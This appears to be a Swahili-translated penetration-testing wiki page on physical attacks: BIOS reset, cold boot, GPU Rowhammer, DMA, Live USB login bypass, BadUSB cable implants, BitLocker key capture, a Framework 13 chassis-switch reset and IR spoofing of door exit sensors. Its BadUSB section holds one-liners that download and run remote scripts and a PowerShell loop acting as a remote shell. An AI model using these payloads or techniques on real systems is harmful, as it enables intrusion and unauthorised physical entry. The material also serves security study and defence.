# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kuwekwa upya kwa kukata betri ya CMOS au kutumia jumper ya clear-CMOS iliyoandikwa kwenye nyaraka. Muda unaohitajika wa kuzima umeme hutegemea board, na manenosiri au funguo za kisasa za UEFI zinaweza kuhifadhiwa kwenye flash isiyopoteza data, embedded controller, au kifaa cha usalama, hivyo zikaendelea kuwepo baada ya kuondoa betri. Tazama mwongozo wa board/service kabla ya kuunganisha pini kwa muda mfupi; utaratibu huu unaweza pia kubatilisha vipimo vya TPM na kuanzisha urejeshaji wa disk-encryption.

Kwenye mifumo ya zamani ya x86, zana kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa na CMOS kutoka kwenye mazingira ya bootable. CmosPwd hutambua miundo ya manenosiri kutoka kwenye orodha iliyoandikwa ya familia za zamani za BIOS na inaweza kuhifadhi nakala, kurejesha, au kufuta/kuua hali ya CMOS; builds zake zilizochapishwa zinalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD, na NetBSD.<sup>[[18]](#references)</sup> Zana hizi si viondoa manenosiri vya jumla vya UEFI na zinahitaji ufikiaji wa kutosha wa hardware/firmware.

Baadhi ya firmware za laptop huonyesha msimbo wa changamoto maalum wa vendor baada ya majaribio kadhaa ya nenosiri yaliyoshindikana. Databases kama [bios-pw.org](https://bios-pw.org) zinaweza kutoa manenosiri ya urejeshaji ya vendor wa zamani kwa baadhi ya modeli, lakini mifumo mingi hutumia lockout bila changamoto inayoweza kutolewa. Chukulia nenosiri lolote linalozalishwa kuwa maalum kwa modeli na epuka kufikisha kikomo cha majaribio ya kudumu.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa variables za Secure Boot. Anza na ukaguzi usiobadilisha mfumo ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kwa makusudi kuharibu variables na inapaswa kutumiwa tu kwenye mfumo wa maabara unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kuwa driver yake yenye privileged access na ufikiaji wa hardware wa kiwango cha chini havifai kwa endpoints za production.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Uchambuzi wa RAM na Mashambulizi ya Cold Boot

DRAM haipotezi kila bit mara moja refresh inaposimama. Kiwango cha decay hutofautiana sana kulingana na teknolojia ya module na halijoto; kupooza kunaweza kuhifadhi data muhimu kwa muda mrefu zaidi kuliko power cycle isiyopozwa. Mashambulizi ya cold-boot huanzisha upya mfumo haraka katika mazingira madogo ya acquisition au huhamisha module iliyopozwa, hunasa memory ghafi, na kujenga upya cryptographic keys licha ya bit decay. Disk-copy utility si lazima iwe physical-memory imager, na Volatility huchanganua capture badala ya kuipata; tumia acquisition tool inayofaa kwa platform na iliyothibitishwa.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa na manufaa zaidi yanapolenga **GPU virtual-memory metadata** badala ya buffers za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kwamba attacker anayeendesha CUDA code bila privileges anaweza kuunda hammering patterns maalum kwa GPU, kutumia **memory massaging** kuweka paging structures kwenye rows zilizo hatarini, na kisha kubadilisha bits katika **last-level page table** au **page directory** ya kati. Translation entry moja inapoharibiwa, attacker anaweza kuanzisha **arbitrary GPU memory read/write** na kisha kugeukia host compromise.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** katika GDDR6 na uunde refresh-aware / non-uniform hammering patterns zinazopita in-DRAM mitigations.
2. **Massage GPU allocations** ili driver iweke page-translation structures katika physical locations zinazoweza kuhammeriwa badala ya kuziweka kwenye default protected pool. Kwa vitendo, hii inaweza kumaanisha kumaliza low-memory page-table region na kusambaza large sparse UVM mappings zenye controlled strides.
3. **Flip translation metadata** kama vile **PFN** au bits zinazohusiana na aperture ndani ya page-table / page-directory entry ili virtual page inayodhibitiwa na attacker itafsiriwe kuwa page-table pages, arbitrary GPU memory, au host-visible system mappings.
4. Tumia tena forged mapping kuandika upya translation entries za ziada na kupanua mashambulizi hadi **arbitrary GPU memory read/write** katika GPU contexts mbalimbali.

### Host Pivot na Mitigations

- **IOMMU ikiwa imezimwa**, forged system-aperture mappings zinaweza kufichua **host physical memory** yoyote kwa GPU, na kubadilisha GPU primitive kuwa full host compromise.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga last-level page-table entries, huku **GeForge** ikionyesha kwamba kuharibu page-directory level kunaweza kuwa rahisi zaidi kwa sababu bit flip moja inaweza kuelekeza upya translation subtree kubwa. Usichukulie paging layer moja pekee kuwa ndiyo yenye umuhimu wa kiusalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia direct arbitrary-host-memory path inayotumiwa na GDDRHammer/GeForge, lakini **si mitigation kamili**. **GPUBreach** inaonyesha second-stage pivot ambapo attacker huharibu CPU buffers zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha huchochea memory-safety bugs za NVIDIA driver ili kupata kernel write primitive na **root shell** hata IOMMU ikiwa imewezeshwa.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya vitendo ya hardening kwenye workstation/server GPUs zinazoiunga mkono. Consumer GPUs zisizo na ECC zina defense surface dhaifu zaidi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti **1,171** bit flips kwenye RTX 3060 na **202** kwenye RTX A6000, ambazo zilitosha kuunda host-privilege-escalation chain inayofanya kazi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

Kwa offline UEFI IFR/NVRAM patching inayoweza kushusha pre-boot IOMMU enforcement na kuwezesha Windows DMA chain, tazama:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** inaonyesha **DMA-based memory acquisition and patching** kupitia interfaces kama FireWire na early Thunderbolt configurations, ikiwa ni pamoja na historical login-bypass signatures. Si sahihi kusema tu kwamba haina ufanisi dhidi ya Windows 10: exploitability hutegemea interface, target build, IOMMU policy, lock state, na ikiwa Windows Kernel DMA Protection inaungwa mkono na imewezeshwa. Windows 10 version 1803 na matoleo ya baadaye yalianzisha Kernel DMA Protection kwenye compatible platforms, na kubadilisha kwa kiasi kikubwa attack surface.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa System Access

Kwenye Windows volume isiyosimbwa au ambayo tayari imefunguliwa, offline environment inaweza kubadilisha accessibility binaries kama **sethc.exe** au **Utilman.exe** na **cmd.exe**, na hivyo kutoa SYSTEM command prompt shortcut inayolingana ya logon-screen inapotekelezwa. Tools kama **chntpw** zinaweza kuhariri local SAM account data. Mbinu hizi hazipiti BitLocker volume iliyofungwa na zinaweza kuharibu credentials zinazolindwa na DPAPI/EFS; hifadhi forensic copies na backups.

**Kon-Boot** ni commercial boot-time authentication-bypass tool kwa supported Windows/macOS configurations. Compatibility hutegemea OS, firmware mode, Secure Boot, na disk-encryption setup; haiwezi kusimbua BitLocker-locked volume.<sup>[[10]](#references)</sup>

---

## Kushughulikia Windows Security Features

### Boot na Recovery Shortcuts

- **Delete/Supr**, F2, F10, au vendor key nyingine inaweza kufungua firmware setup.
- **F8** huingia kwenye legacy Windows advanced boot options tu kwenye configurations ambazo njia hiyo bado imewezeshwa; recovery entry ya sasa hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia Windows automatic logon katika baadhi ya configurations, ingawa policy/registry settings zinaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### BAD USB Devices

Devices kama **USB Rubber Ducky** na Teensy boards zinaweza kujitambulisha kama trusted HID keyboards na kuingiza predefined keystrokes. Payload mwanzoni huwa na privileges na desktop access za logged-on session; UAC prompts, screen locking, keyboard layout, timing, na endpoint USB policy bado huiwekea vikwazo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator au backup privileges zinaweza kuunda shadow copy au kuhifadhi registry hives ili locked files kama **SAM** na **SYSTEM** ziweze kupatikana. Hii ni post-compromise collection technique, si privilege bypass, na inapaswa kuhusishwa na matukio ya `diskshadow`/VSS na registry-hive export.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants kama **Evil Crow Cable Wind** hujificha ndani ya USB-A→USB-C au USB-C↔USB-C cables, hujitambulisha kabisa kama USB keyboard, na huweka wazi C2 stack yake kupitia Wi-Fi. Operator anahitaji tu kuwasha cable kutoka kwa victim host, kuunda hotspot yenye jina `Evil Crow Cable Wind` na password `123456789`, kisha kuvinjari [http://cable-wind.local/](http://cable-wind.local/) (au DHCP address yake) ili kufikia embedded HTTP interface.<sup>[[8]](#references)</sup>
- Browser UI hutoa tabs za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Payloads zilizohifadhiwa huwekewa tags kwa kila OS, keyboard layouts hubadilishwa wakati huo huo, na VID/PID strings zinaweza kubadilishwa ili kuiga known peripherals.
- Kwa sababu C2 iko ndani ya cable, simu inaweza kuandaa payloads, kuchochea execution, na kudhibiti Wi-Fi credentials bila kutumia network ya organization—jambo linalofaa kwa physical intrusions zenye dwell-time fupi.

### OS-aware AutoExec payloads

- AutoExec rules hufunga payload moja au zaidi ili ziendeshwe mara moja baada ya USB enumeration. Implant hufanya lightweight OS fingerprinting na kuchagua script inayolingana.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa execution hufanyika bila usimamizi, kubadilisha tu charging cable kunaweza kupata “plug-and-pwn” initial access chini ya logged-on user context.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Payload iliyohifadhiwa hufungua console na kubandika loop inayotekeleza chochote kinachowasili kwenye USB serial device mpya. Windows variant ndogo ni:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant huweka channel ya USB CDC ikiwa wazi huku ESP32-S3 yake ikizindua TCP client (Python script, Android APK, au desktop executable) kuelekea kwa operator. Bytes zozote zinazoandikwa kwenye TCP session hutumwa kwenye serial loop iliyo hapo juu, hivyo kuwezesha remote command execution hata kwenye air-gapped hosts. Output ni ndogo, kwa hiyo operators kwa kawaida huendesha blind commands (kuunda accounts, kuweka ziada ya tooling, n.k.).

### HTTP OTA update surface

- Interface ya Evil Crow Cable Wind iliyoandikwa kwenye documentation inaonyesha firmware-update endpoint isiyohitaji authentication kwenye `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators wanaweza kubadilisha features kwa hot-swap (mfano, flash firmware ya Army Knife ya flash USB) katikati ya engagement bila kufungua cable, hivyo kuruhusu implant kubadili hadi capabilities mpya ikiwa bado imechomekwa kwenye host inayolengwa.

## Kupita Usimbaji wa BitLocker

Upatikanaji wa ki-forensic ulioidhinishwa wa mfumo unaofanya kazi au uliokuwa ukiendesha hivi karibuni unaweza kuwa na volume master key ya BitLocker au key material inayohusiana nayo wakati volume ikiwa unlocked. Tools za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta memory images, hibernation files, au crash dumps zinazotumika, lakini mafanikio hayajahakikishwa. Windows za kisasa pia husimba crash dumps wakati BitLocker imewezeshwa, na recovery password iliyohifadhiwa yenye tarakimu 48 ni artifact tofauti na volume key iliyo kwenye memory.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering kwa Kuongeza Recovery Key

Attacker anayemshawishi administrator kuendesha commands za usimamizi wa BitLocker anaweza kuongeza recovery-password, external-key, au protector mwingine kisha kuikamata. Recovery password haiwezi kuwa string holela ya zero: recovery passwords za nambari za BitLocker zina format iliyothibitishwa ya tarakimu 48. Syntax inayohusika ya authorized administration ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha protectors zilizotokana nayo kwa `manage-bde -protectors -get C:`. Fuatilia nyongeza za protectors na uhakikishe kuwa recovery material mpya ina-escrowiwa tu kwenye locations zilizoidhinishwa.<sup>[[16]](#references)</sup>

---

## Kutumia Chassis Intrusion / Maintenance Switches Kufanya Factory-Reset ya BIOS

Laptops nyingi za kisasa na desktops za small-form-factor zina **chassis-intrusion switch** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa madhumuni ya msingi ya switch hiyo ni kutoa alert kifaa kinapofunguliwa, vendors wakati mwingine huweka **undocumented recovery shortcut** inayowashwa switch inapobadilishwa katika pattern maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Attack Inavyofanya Kazi

1. Switch imeunganishwa kwenye **GPIO interrupt** ya EC.
2. Firmware inayotumika kwenye EC huhifadhi kumbukumbu ya **timing na idadi ya mibofyo**.
3. Pattern iliyowekwa ndani ya firmware inapotambuliwa, EC huendesha routine ya *mainboard-reset* ambayo **hufuta yaliyomo kwenye system NVRAM/CMOS**.
4. Kwenye boot inayofuata, models zilizoathiriwa hupakia hali ya firmware iliyoresetwa. Kulingana na vendor na revision, hali iliyofutwa inaweza kujumuisha supervisor password, mipangilio maalum ya boot, au Secure Boot keys zilizo-enrolliwa; hali ya TPM na athari za disk-encryption lazima zitathminiwe kando.

> Firmware reset inaweza kurejesha external-boot options, lakini **haisimbui storage**. BitLocker au mfumo mwingine wa full-disk encryption unaweza kuingia kwenye recovery baada ya mabadiliko ya TPM/firmware na bado kulinda drive ya ndani bila recovery key.<sup>[[16]](#references)</sup>

### Mfano wa Ulimwengu Halisi – Framework 13 Laptop

Recovery shortcut ya Framework 13 (11th/12th/13th-gen) ni:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Baada ya mzunguko wa kumi, EC huweka flag inayoiagiza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu mzima huchukua takriban sekunde 40 na hauhitaji **chochote isipokuwa bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa au kisitisha na kukiendelea tena ili EC iwe inaendesha.
2. Ondoa kifuniko cha chini ili kufichua switch ya intrusion/maintenance.
3. Rudia muundo wa toggle unaotegemea vendor (angalia documentation, forums, au reverse-engineer firmware ya EC).
4. Unganisha tena na uwashe upya, kisha kagua ni mipangilio ipi ya firmware na credentials iliyobadilika.
5. Ikiwa umeidhinishwa na external boot inapatikana, washa live image inayodhibitiwa. Mara tu volume ya ndani inapokuwa legitimately unlocked (au ikiwa haikuwahi ku-encryptiwa), live environment inaweza kupata credentials na data au kukagua EFI System Partition. Kubadilisha partition hiyo ili kusakinisha EFI implant ni persistent na intrusive sana, na hubaki na vikwazo vya Secure Boot, measured boot, firmware write protection, na endpoint monitoring. Encrypted storage hubaki inaccessible bila key yake au recovery material.

### Detection & Mitigation

* Rekodi matukio ya chassis-intrusion katika OS management console na uyalinganishe na BIOS resets zisizotarajiwa.
* Tumia **tamper-evident seals** kwenye screws/covers ili kugundua kufunguliwa.
* Weka vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia kuwa physical access ni sawa na full compromise.
* Pale inapopatikana, zima feature ya vendor ya “maintenance switch reset” au hitaji cryptographic authorisation ya ziada kwa NVRAM resets.

---

## Covert IR Injection Dhidi ya No-Touch Exit Sensors

### Sifa za Sensor
- Commodity “wave-to-exit” sensors huunganisha near-IR LED emitter na TV-remote style receiver module ambayo huripoti logic high tu baada ya kuona pulses nyingi (~4–10) za carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastic shroud huzuia emitter na receiver kutazamana moja kwa moja, hivyo controller hudhani kuwa carrier yoyote iliyothibitishwa imetokana na reflection iliyo karibu na huendesha relay inayofungua door strike.
- Mara controller inapoamini kuwa target ipo, mara nyingi hubadilisha outbound modulation envelope, lakini receiver huendelea kukubali burst yoyote inayolingana na carrier iliyochujwa.

### Attack Workflow
1. **Capture emission profile** – unganisha logic analyser kwenye controller pins ili kurekodi waveforms za pre-detection na post-detection zinazoendesha internal IR LED.
2. **Replay only the “post-detection” waveform** – ondoa/puuza stock emitter na uendeshe external IR LED kwa pattern iliyokwisha-triggeriwa tangu mwanzo. Kwa kuwa receiver inajali tu pulse count/frequency, huchukulia carrier iliyospoofiwa kuwa reflection halisi na ku-assert relay line.
3. **Gate the transmission** – tuma carrier katika bursts zilizotunwa (kwa mfano, makumi ya milliseconds ikiwa imewashwa, kisha muda unaofanana ikiwa imezimwa) ili kutoa pulse count ya chini bila kusaturate AGC ya receiver au interference handling logic. Emission endelevu huondoa sensitivity ya sensor haraka na kuzuia relay kufyatuka.

### Long-Range Reflective Injection
- Kubadilisha bench LED na high-power IR diode, MOSFET driver, na focusing optics huwezesha triggering ya kuaminika kutoka umbali wa takriban mita 6.
- Mshambuliaji hahitaji line-of-sight hadi receiver aperture; kuelekeza beam kwenye interior walls, shelving, au door frames zinazoonekana kupitia glass huruhusu reflected energy kuingia katika field of view ya ~30° na kuiga hand wave ya umbali mfupi.
- Kwa kuwa receivers hutarajia reflections dhaifu tu, external beam yenye nguvu zaidi inaweza kugonga surfaces nyingi na bado ibaki juu ya detection threshold.

### Weaponised Attack Torch
- Kuweka driver ndani ya commercial flashlight huficha tool waziwazi. Badilisha visible LED na high-power IR LED inayolingana na band ya receiver, ongeza ATtiny412 (au inayofanana) ili kuzalisha bursts za ≈30 kHz, na tumia MOSFET kusink current ya LED.
- Telescopic zoom lens hukaza beam kwa range/precision, huku vibration motor iliyo chini ya MCU control ikitoa haptic confirmation kwamba modulation inafanya kazi bila kutoa visible light.
- Kuzunguka kati ya modulation patterns kadhaa zilizohifadhiwa (carrier frequencies na envelopes zinazotofautiana kidogo) huongeza compatibility katika sensor families zilizorebrandiwa, na kumruhusu operator kusweep reflective surfaces hadi relay isikike ikiclick na mlango ufunguke.

---

## References

- [1] [GDDRHammer: Kusumbua Sana Safu za DRAM — Cross-Component Rowhammer Attacks kutoka kwa Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Kuhammer GDDR Memory ili Kuunda GPU Page Tables kwa Burudani na Faida](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks kwenye GPUs kwa kutumia Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - Julai 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili kupwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Mainboard Reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Kupita IR No-Touch Exit Sensors kwa Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking kwa Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Dhidi ya NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentation rasmi ya Kon-Boot na maelezo ya compatibility](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks kwenye Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation kupitia DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - kushikilia Shift na automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation na downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
